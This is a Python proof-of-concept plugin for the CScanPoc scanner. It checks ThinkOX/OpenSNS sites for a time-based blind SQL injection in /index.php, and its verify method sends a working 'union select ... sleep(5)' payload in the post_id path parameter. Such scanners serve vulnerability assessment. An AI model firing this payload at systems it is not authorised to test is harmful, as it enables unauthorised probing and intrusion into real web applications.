# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ThinkOX_0006'  # 平台漏洞编号，留空
    name = 'ThinkOX SQL 盲注漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-22'  # 漏洞公布时间
    desc = '''
        ThinkOX 2015 年 1 月 28 日 ThinkOX 正式更名为 OpenSNS，意思是基于OpenCenter的社交程序。
        ThinkOX /index.php 参数未经过过滤导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3100/'  # 漏洞来源https://bugs.shuimugan.com/bug/view?bug_no=087529
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkOX'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd525947d-6b8f-4fc0-a1d1-ffb1a7623ace'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(target=self.target)+'/index.php'
            payload = '?s=/group/index/recommend/post_id/-1)%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,sleep(5)%23.html '
            start_time = time.time()

            code, _, _, _, _ = hh.http(verify_url + payload)

            if code == 200 and (time.time() - start_time > 4):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
